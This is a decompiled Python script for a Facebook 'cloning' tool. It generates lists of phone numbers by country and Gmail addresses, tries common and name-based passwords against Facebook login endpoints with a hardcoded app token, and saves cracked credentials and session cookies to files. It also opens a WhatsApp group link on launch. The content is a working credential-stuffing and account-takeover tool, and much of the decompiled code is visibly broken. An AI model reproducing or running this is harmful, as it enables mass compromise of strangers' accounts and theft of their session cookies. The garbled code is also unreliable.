# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —

from ast import Pass
from os import name, path
import os
import base64
import zlib
import pip
import urllib
from weakref import proxy
import os
import base64
import zlib
import platform
from urllib.request import parse_http_list
os.system('xdg-open https://chat.whatsapp.com/GjKY8C8AMhNJLwhKzCBQtr')
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as bsp
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import string
from concurrent.futures import ThreadPoolExecutor as tred
cellphone = [
    'SM-G920F|NRD90M',
    'SM-T535|LRX22G',
    'SM-T231|KOT49H',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-N7100|KOT49H',
    'SM-T561|KTU84P',
    'GT-N7100|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY47V',
    'SM-G930F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X',
    'GT-P5100|IML74K',
    'SM-J320F|LMY47V',
    'GT-N8000|JZO54K',
    'SM-T531|LRX22G',
    'SPH-L720|KOT49H',
    'GT-I9500|JDQ39',
    'SM-G935F|NRD90M',
    'SM-T561|KTU84P',
    'SM-T531|KOT49H',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'SM-A500FU|MMB29M',
    'SM-A500F|MMB29M',
    'SM-T311|KOT49H',
    'SM-T531|LRX22G',
    'SM-J320F|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-J320F|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T230|KOT49H',
    'GT-I9192|KOT49H',
    'SM-T235|KOT4',
    'GT-N7100|KOT49H',
    'SM-A500F|LRX22G',
    'SM-A500F|MMB29M',
    'GT-N7100|KOT49H',
    'SM-G920F|MMB29K',
    'SM-J510FN|NMF26X',
    'GT-N8000|JZO54K',
    'SM-J320FN|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-A500H|MMB29M',
    'GT-I9300|JSS15J',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY4',
    'SM-J510FN|NMF26X',
    'SM-A500F|MMB29M',
    'GT-N8000|KOT49H',
    'SM-T561|KTU84P',
    'SM-G900F|KOT49H',
    'GT-S7390|JZO54K',
    'SM-J320F|LMY47V',
    'GT-P5100|JZO54K',
    'SM-A500FU|MMB29M',
    'SM-G930F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T561|KTU84P',
    'GT-N8000|KOT49H',
    'SM-T531|LRX22G',
    'SM-J510FN|MMB29M',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5110|JDQ39',
    'GT-I9301I|KOT49H',
    'SM-A500F|LRX22G',
    'SM-G930F|NRD90M',
    'SM-T311|KOT4',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'SM-J320M|LMY47V',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'GT-I9192|KOT49H',
    'SM-G935F|MMB29K',
    'SM-J701F|NRD90M;',
    'GT-I9301I|KOT4',
    'SM-J320FN|LMY47V',
    'SM-T111|JDQ39',
    'SM-A500F|MMB29M',
    'SM-J510FN|NMF2',
    'SM-T705|LRX22G',
    'SM-G920F|NRD90M',
    'GT-N5100|JZO54K',
    'GT-I9300I|KTU84P',
    'GT-I9300I|KTU84P',
    'GT-N8000|KOT49H',
    'GT-N8000|KOT49H',
    'SM-A500F|MMB29M',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5100|JDQ39',
    'GT-I9300I|KTU84P',
    'GT-N5100|JZO54K',
    'GT-N8000|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'GT-N8000|JZO54K',
    'SM-T805|LRX22G',
    'SM-T231|KOT49H',
    'GT-N5100|JZO54K',
    'SM-J320H|LMY47V',
    'SM-T231|KOT49H',
    'SM-G930F|NRD90M',
    'SM-G935F|NRD90M',
    'SM-T310|KOT49H',
    'GT-N8000|KOT49H',
    'GT-I9300I|KTU84P',
    'SM-G920F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T705|LRX22G;',
    'GT-P3110|JZO54K',
    'GT-I9192|KOT49H',
    'SM-J320F|LMY47V',
    'SM-G920F|NRD90M',
    'GT-I9300|IMM76D',
    'SM-G950F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X;',
    'SM-J701F|NRD90M',
    'SM-A500F|LRX22G',
    'SM-T231|KOT49H',
    'SM-T311|KOT49H',
    'SM-J320FN|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T805|LRX22G',
    'GT-I9500|LRX22C',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'GT-I9300|JSS15J',
    'GT-N7100|KOT49H',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'SM-T315|JDQ39',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-P5220|JDQ39',
    'SM-T525|KOT49H',
    'SM-T555|LRX22G',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X;',
    'SM-A500F|MMB29M',
    'GT-I9192|KOT49H',
    'GT-P5100|JDQ',
    'SM-T311|KOT49H']

def HUNTER():
    en = random.choice([
        'en_US',
        'en_GB',
        'en_PK',
        'ru_RU',
        'de_DE',
        'th_TH',
        'en_BD',
        'en_IN',
        'en_AF'])
    kt = random.choice([
        'com.facebook.katana',
        'com.facebook.orca',
        'com.facebook.mlite'])
    fbcr = random.choice([
        'o2 - de',
        'Verizon - us',
        'MY CELCOM',
        'Vodafone - uk',
        'null',
        'DTAC',
        'IND airtel',
        'Nepal Telecom'])
    s = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/{str(fbcr)};FBMF/Apple iPhone 9;FBBD/Apple iPhone 9;FBPN/com.facebook.katana;FBDV/Apple A13 Bionic;FBSV/13.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    e = '[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO P703;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = s + e
    return ua

ugen = []
for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(fullagnt)
    
    def clear():
        os.system('clear')
        print(logo)

    logo = "\x1b[1;37mdb   db db    db d8b   db d888888b d88888b d8888b. \n88   88 88    88 888o  88 `~~88~~' 88'     88  `8D \n88ooo88 88    88 88V8o 88    88    88ooooo 88oobY' \n88~~~88 88    88 88 V8o88    88    88~~~~~ 88`8b   \n88   88 88b  d88 88  V888    88    88.     88 `88. \nYP   YP ~Y8888P' VP   V8P    YP    Y88888P 88   YD\x1b[1;32m\n---------------------------------------\n⋙ \x1b[1;37mAuthor   :  RAFIULLAH\n⋙ Facebook :  HUNTER RETURN\x1b[1;32m\n⋙ \x1b[1;37mVERSION   :  0.7\n---------------------------------------"
    
    def line():
        print('\x1b[1;37m-----------------------------------------------')

    loop = 0
    oks = []
    cps = []
    pcp = []
    ck = []
    
    def asha(uid):
        if len(uid) == 15:
            if 10 in ('1000000000',):
                alif = ' (*-*) 2009 OK'
                return alif
            if 9 in ('100000000',):
                alif = ' ACCOUNT  2009 OK'
                return alif
            if 8 in ('10000000',):
                alif = ' ACCOUNT 2009 OK'
                return alif
            if 7 in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
                alif = ' ACCOUNT 2009 OK'
                return alif
            if 7 in ('1000006', '1000007', '1000008', '1000009'):
                alif = ' ACCOUNT 2010 OK'
                return alif
            if 6 in ('100001',):
                alif = ' ACCOUNT 2010/2011 OK ID'
                return alif
            if 6 in ('100002', '100003'):
                alif = ' ACCOUNT 2011/2012 OK ID'
                return alif
            if 6 in ('100004',):
                alif = ' ACCOUNT 2012/2013 OK ID'
                return alif
            if 6 in ('100005', '100006'):
                alif = ' ACCOUNT '
                return alif
            if 6 in ('100007', '100008'):
                alif = ' ACCOUNT '
                return alif
            if 6 in ('100009',):
                alif = ' OK ID '
                return alif
            if 5 in ('10001',):
                alif = ' OK ID '
                return alif
            if 5 in ('10002',):
                alif = ' OK ID '
                return alif
            if 5 in ('10003',):
                alif = ' OK ID '
                return alif
            if 5 in ('10004',):
                alif = ' OK ID '
                return alif
            if 5 in ('10005',):
                alif = ' OK ID '
                return alif
            if 5 in ('10006', '10007', ''):
                alif = ' OK ID '
                return alif
            if 5 in ('10008',):
                alif = ' OK ID '
                return alif
            if 5 in ('10009',):
                alif = ' OK ID'
                return alif
            alif = None
            return alif
        if None(uid) in (9, 10):
            alif = ' ACCOUNT 2008/2009 OK'
            return alif
        if None(uid) == 8:
            alif = ' ACCOUNT 2007/2008 OK'
            return alif
        if None(uid) == 7:
            alif = ' ACCOUNT 2006/2007 OK'
            return alif
        alif = None
        return alif

    
    def menu():
        clear()
        x = '***'
        if x == '***':
            print('\x1b[92;1m[\x1b[1;32m1\x1b[92;1m]\x1b[1;37m FILE CLONING')
            print('\x1b[92;1m[\x1b[1;32m2\x1b[92;1m]\x1b[1;37m RANDOM CLONING')
            print('\x1b[92;1m[\x1b[1;32m3\x1b[92;1m]\x1b[1;37m GMAIL CLONING')
            print('\x1b[92;1m[\x1b[1;32m0\x1b[92;1m]\x1b[1;37m EXIT ')
            line()
            xd = input(' CHOOSE AN OPTION: ')
            if xd in ('3', '03'):
                gmail()
            if xd in ('1', '01'):
                clear()
                print(' PUT FILE EXAMPLE :  /sdcard/file.txt.etc..')
                line()
                file = input(' PUT FILE PATH\x1b[1;37m: ')
                fo = open(file, 'r').read().splitlines()
                clear()
                print('[1] METHOD ')
                print('[2] METHOD ')
                print('[3] METHOD ')
                print('[4] METHOD ')
                line()
                mthd = input(' CHOOSE : ')
                line()
                clear()
                plist = []
                ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                line()
                clear()
                print('\x1b[1;32m EXAMPLE : first last,firtslast,first123')
                line()
                for i in range(ps_limit):
                    plist.append(input(f''' PUT PASSWORD {i + 1}: '''))
                    line()
                    clear()
                    print(' DO YOU WANT SHOW COOKIES :? (Y/N): ')
                    line()
                    cx = input(' CHOOSE : ')
                    if cx in ('y', 'Y', 'yes', 'Yes', '1'):
                        pcp.append('y')
                pcp.append('n')
                crack_submit = tred(max_workers = 30)
                clear()
                total_ids = str(None(len))
                print(' TOTAL ACCOUNT : \x1b[1;32m' + total_ids + ' ')
                print(' \x1b[1;97mUSE FLIGHT MODE DURING CLONING')
                line()
                for user in fo:
                    (ids, names) = user.split('|')
                    passlist = plist
                    if mthd in ('1', '01'):
                        crack_submit.submit(api1, ids, names, passlist)
                    if mthd in ('2', '02'):
                        crack_submit.submit(newidx, ids, names, passlist)
                    if mthd in ('3', '03'):
                        crack_submit.submit(ffb, ids, names, passlist)
                    if not mthd in ('4', '04'):
                        pass
                    crack_submit.submit(newidx, ids, names, passlist)
                    None(None, None)
                    print('\x1b[1;37m')
                    line()
                    print(' THE PROCESS HAS COMPLETED')
                    print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
                    line()
                    input(' PRESS ENTER TO BACK ')
                    os.system('python s1n.py')
                    return None
                    if xd in ('2', '02'):
                        clear()
                        print(' \x1b[1;37m[\x1b[1;32m1\x1b[1;37m]\x1b[1;37m PAKISTAN CLONING\n \x1b[1;37m[\x1b[1;32m2\x1b[1;37m]\x1b[1;37m BANGLADESH CLONING\n \x1b[1;37m[\x1b[1;32m3\x1b[1;37m]\x1b[1;37m AFGHANISTAN CLONING\n \x1b[1;37m[\x1b[1;32m4\x1b[1;37m]\x1b[1;37m INDIA CLONING\n \x1b[1;37m[\x1b[1;32m5\x1b[1;37m]\x1b[1;37m GMAIL CLONING\n \x1b[1;37m[\x1b[1;32m0\x1b[1;37m]\x1b[1;37m BACK MENU')
                        line()
                        x = input(' Choose: ')
                        if x in ('1', '01'):
                            pak()
                            return None
                        if x in ('2', '02'):
                            bd()
                            return None
                        if x in ('3', '03'):
                            afg()
                            return None
                        if x in ('4', '04'):
                            ind()
                            return None
                        if x in ('5', '05'):
                            gmail()
                            return None
                        menu()
                        return None
            if xd in ('0', '00'):
                exit()
                return None
            return None
        return None
        if FileNotFoundError:
            print(' FILE LOCATION NOT FOUND ')
            time.sleep(1)
            menu()
        ps_limit = 1
        if not None:
            pass
        if requests.exceptions.ConnectionError:
            print('\n NO INTERNET CONNECTION ...')
            exit()
            return None

    
    def pak():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 0300,0315,0335,0340')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECTED CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE DURING CLONING \x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    psx,
                    ids,
                    'khankhan',
                    'malik123',
                    'kingkhan',
                    'baloch123',
                    'pak123',
                    'khan123',
                    'janjan',
                    'ali123']
                S1N.submit(rd, ids, passlist)
                None(None, None)
                print('\x1b[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
                return None
                if ValueError:
                    ''.join
                    limit = 5000
        if not None:
            pass

    
    def bd():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 017, 018, 019, 016, 9196, 9178')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(8)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECTED CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE DURING CLONING\x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    8,
                    ids,
                    None,
                    7,
                    'mimmim',
                    'fatema',
                    'jannat',
                    'sadiya',
                    'Bangla',
                    '@@@###',
                    '304050',
                    '102030',
                    '203040',
                    '708090',
                    'i love you',
                    'FREE FIRE',
                    'free fire',
                    'bangladesh',
                    'Pubgmobile',
                    'bangla']
                S1N.submit(bd1, ids, passlist)
                None(None, None)
                print('\x1b[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
                return None
                if ValueError:
                    ids
                    limit = 5000
        if not ids:
            pass
        psx
        ''.join

    
    def afg():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 9377,9379,9374')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECTED CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE DURING CLONING\x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    psx,
                    ids,
                    'afghan',
                    'afghan12345',
                    'afghan123',
                    '600700',
                    'afghanistan',
                    'afghan1122',
                    '500500',
                    '100200',
                    '10002000',
                    '900900',
                    'kabul123',
                    'Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹',
                    'Û±Û³Û³Û³ÛµÛ¶',
                    'afghan1234',
                    'kabul1234',
                    'khankhan',
                    'khan123',
                    'khan123456',
                    'khan786']
                S1N.submit(rd, ids, passlist)
                None(None, None)
                print('\x1b[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
                return None
                if ValueError:
                    ''.join
                    limit = 5000
        if not None:
            pass

    
    def ind():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 91***,etc')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECTED CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE FOR SPEED UP \x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    psx,
                    ids,
                    '57273200',
                    'hindustan',
                    '59039200',
                    '57575751']
                S1N.submit(rd, ids, passlist)
                None(None, None)
                print('\x1b[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
                return None
                if ValueError:
                    ''.join
                    limit = 5000
        if not None:
            pass

    
    def gmail():
        os.system('rm -rf .re.txt')
        clear()
        print('\x1b[1;37m Example: saad,arman,rashid, areej \x1b[1;97m')
        line()
        first = input(' first name laga: ')
        line()
        print('\x1b[1;37m example: ahmad,khan,baloch,fatima \x1b[1;97m')
        line()
        last = input(' last name laga: ')
        line()
        print(' Example: @gmail.com , @yahoo.com etc...')
        line()
        domain = input(' domain: ')
        line()
        limit = int(input(' LIMIT LAGA : '))
        line()
        print(' Getting gmails...')
        lists = [
            '3',
            '4']
        for xd in range(limit):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(3)())
                open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
            mail = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(4)())
            open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
            fo = open('.re.txt', 'r').read().splitlines()
            S1N = tred(max_workers = 30)
            total = str(None(len))
            clear()
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] TOTAL ACCOUNT: \x1b[1;32m' + total)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] USE FLIGHT MODE AFTER 5 MINUTES\x1b[1;97m')
            line()
            for user in fo:
                (ids, names) = user.split('|')
                first_name = names.rsplit(' ')[0]
                last_name = names.rsplit(' ')[1]
                fs = first_name.lower()
                ls = last_name.lower()
                passlist = [
                    fs + ls,
                    fs + ' ' + ls,
                    fs + '123',
                    fs + '12345',
                    fs + '1122',
                    fs,
                    fs + '1234',
                    fs + '786',
                    fs + '12',
                    ls + '123',
                    fs + ls + '123',
                    ls + '12345',
                    'khankhan',
                    'khan123',
                    'khan1234',
                    'khan786',
                    '57273200',
                    'khan1122',
                    'khanbaba',
                    'janjan']
                S1N.submit(rd, ids, passlist)
                None(None, None)
                print('\x1b[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
                line()
                input(' Press enter to back ')
                os.system('python s1n.py')
                return None
                if ValueError:
                    ''.join
                    limit = 5000
        if IndexError:
            last_name = 'Khan'
        if not ''.join:
            pass

    
    def ffb(ids, names, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        session = requests.Session()
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(HUNTER())
            head = 'en-US,en;q=0.9'
            getlog = session.get(f'''https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
            idpass = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                'uid': ids,
                'next': 'https://mbasic.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pas }
            complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
            Aws = session.cookies.get_dict().keys()
            if 'c_user' in Aws:
                coki = session.cookies.get_dict()
                for key, value in []:
                    value = session.cookies.get_dict().items()[f'''{key!s}={value!s}''']
                    key = session.cookies.get_dict().items()
                    kuki = None(';'.join)
                    print(f'''\x1b[96;1 [HUNTER-OK] {ids!s} | {pas!s}''')
                    open('/sdcard/HUNTER-OK.txt', 'a').write(ids + '|' + pas + '\n')
                    open('/sdcard/HUNTER-OK-COOKiE.txt', 'a').write(ids + '|' + pas + '|' + kuki + '\n')
                    oks.append(ids)
                    'accept-language'
                    if 'checkpoint' in Aws:
                        if 'y' in pcp:
                            print('\r\r\x1b[38;5;208m [HUNTER-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                            open('/sdcard/HUNTER-CP.txt', 'a').write(ids + '|' + pas + '\n')
                            cps.append(ids)
                            'gzip, deflate, br'
                        'accept-encoding'
        loop += 1
        return None
        'document'
        last = 'Khan'
        'sec-fetch-dest'
        value = '?1'
        key = 'sec-fetch-user'
        if requests.exceptions.ConnectionError:
            'navigate'
            time.sleep(20)

    
    def api1(ids, names, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;97mHUNTER\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        ln = names.split(' ')[1]
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            head = {
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
            data = {
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
            po = requests.post('https://b-graph.facebook.com/auth/login', data = data, headers = head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\x1b[1;32m [HUNTER-OK] ' + uid + ' | ' + pas + '|' + asha(uid) + '\x1b[1;32m')
                ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookies = f'''sb={ssbb};{ckkk}'''
                print('\x1b[1;33m [\x1a] COOKI :- \x1b[1;30m' + cookies)
                open('/sdcard/HUNTER-OK.txt', 'a').write(uid + '|' + pas + '|' + cookies + '\n')
                oks.append(uid)
                ';'.join
            if 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print('\r\r\x1b[1;91m [HUNTER-CP] ' + uid + ' | ' + pas + '\x1b[1;91m')
                open('/sdcard/HUNTER-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
        loop += 1
        return None
        '0'
        ln = fn
        if requests.exceptions.ConnectionError:
            'currently_logged_in_userid'
            time.sleep(20)
            return None
        if Exception:
            e = '1'
            e = None
            del e
            return None
            e = None
            del e

    
    def rd(ids, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;97mHUNTER\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        for pas in passlist:
            access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head = {
                'x-fb-connection-token': access_token }
            data = {
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': access_token }
            po = requests.post('https://graph.facebook.com/auth/login', data = data, headers = head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\x1b[1;32m [HUNTER-OK] ' + uid + ' | ' + pas + ' | ' + asha(uid) + '\x1b[1;32m')
                ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookies = f'''sb={ssbb};{ckkk}'''
                print('\x1b[1;33m [\x1a] COOKI :-\x1b[1;30m ' + cookies)
                open('/sdcard/HUNTER-R-OK.txt', 'a').write(uid + '|' + pas + '|' + cookies + '\n')
                oks.append(uid)
                ';'.join
            if 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print('\r\r\x1b[1;90m [HUNTER-CP] ' + uid + ' | ' + pas + '\x1b[1;91m')
                open('/sdcard/HUNTER-R-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
        loop += 1
        return None
        if requests.exceptions.ConnectionError:
            '0'
            time.sleep(20)
            return None
        if Exception:
            e = 'currently_logged_in_userid'
            e = None
            del e
            return None
            e = None
            del e

    
    def bd1(ids, passlist):
        global loop
        for ps in passlist:
            session = requests.Session()
            sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-XD\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
            sys.stdout.flush()
            pro = random.choice(HUNTER())
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': ids,
                'pass': ps,
                'login': 'Log In' }
            header_freefb = 'Keep-Alive'
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
